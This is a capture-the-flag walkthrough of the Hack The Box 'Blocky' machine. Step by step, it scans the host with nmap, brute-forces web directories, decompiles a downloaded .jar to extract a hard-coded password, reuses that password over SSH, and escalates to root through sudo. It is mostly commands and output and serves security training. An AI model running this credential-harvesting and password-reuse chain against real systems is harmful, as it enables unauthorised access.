<center><h1>Blocky</h1></center>
<br>
<center><h3>Summary</h3></center>
<br>
- Get credentials from a .jar file located in the <b>/plugins</b> directory
- Use the password found to ssh in the system as the user notch
- Run <b>sudo -l</b> to see that we can run commands as sudo
<br><br>

First we start with an nmap scan.
```
# Nmap 7.70 scan initiated Fri May 31 12:13:39 2019 as: nmap -sV -sC -T4 -oN BlockyNmap 10.10.
10.37
Nmap scan report for 10.10.10.37
Host is up (0.036s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5a
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp closed sophos
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 31 12:13:52 2019 -- 1 IP address (1 host up) scanned in 13.20 seconds
```
<br>
So there are a few ports open. FTP wont tell us much since we dont have any credentials to log in with. A simple search will tell you that SSH is not vulnerable. I don't know what sophos is so I am going to explore port 80 first. We are greeted with a wordpress page.

<center><img src="/htb/blocky/home.png"></center>
<br>

I look around and don't find much except for a post made by the user Notch. Next, I decide to run a gobuster
```
gobuster dir -u http://10.10.10.37 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.37
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2019/09/16 15:04:36 Starting gobuster
===============================================================
/wiki (Status: 301)
/wp-content (Status: 301)
/index.php (Status: 301)
/wp-login.php (Status: 200)
/plugins (Status: 301)
/license.txt (Status: 200)
/wp-includes (Status: 301)
/javascript (Status: 301)
/wp-trackback.php (Status: 200)
```
<br>
Navigating to the <b>/plugins</b> directory, you will see two files. Lets download them both to our host

<center><img src="/htb/blocky/files.png"></center>

Both of the files are <b>.jar</b> files which means the contents need to be extracted. The command below will list the files inside the <b>.jar</b> file.

```
jar -tf BlockyCore.jar
```
<br>
we see that it lists a file
```
META-INF/MANIFEST.MF
com/myfirstplugin/BlockyCore.class
```
<br>
Lets extract that specific file.
```
jar xf BlockyCore.jar com/myfirstplugin/BlockyCore.class
```
Now to read the file we need to use the <b>javap</b> command.
```
javap -c com/myfirstplugin/BlockyCore.class
```
<br>
You should get the output below. If you read through the file you should see something like resembles credentials.
```
11: ldc           #18                 // String root <-----User
13: putfield      #20                 // Field sqlUser:Ljava/lang/String;
16: aload_0
17: ldc           #22                 // String 8YsqfCTnvxAUeduzjNSXe22 <-----Password
19: putfield      #24                 // Field sqlPass:Ljava/lang/String;
```
<br>
Now first thing I tried was logging into the wordpress site but that didnt work. Next I tried ssh but it didnt work with the user <b>root</b>. I tried to ssh again but this time using the user <b>notch</b> and password <b>8YsqfCTnvxAUeduzjNSXe22</b> and it worked.
```
root@kali: ssh notch@10.10.10.37

The authenticity of host '10.10.10.37 (10.10.10.37)' can't be established.
ECDSA key fingerprint is SHA256:lg0igJ5ScjVO6jNwCH/OmEjdeO2+fx+MQhV/ne2i900.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.37' (ECDSA) to the list of known hosts.
notch@10.10.10.37's password:
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Tue Jul 25 11:14:53 2017 from 10.10.14.230
notch@Blocky:~$
```
<br>
Now if we type <b>sudo -l</b> and enter the same password as before then you will see that we have sudo rights which means we can just grab both the user and root flags. The user flag is located at <b>/home/notch/user.txt</b> and the root is at <b>/root.root.txt</b>
<br><br><br>
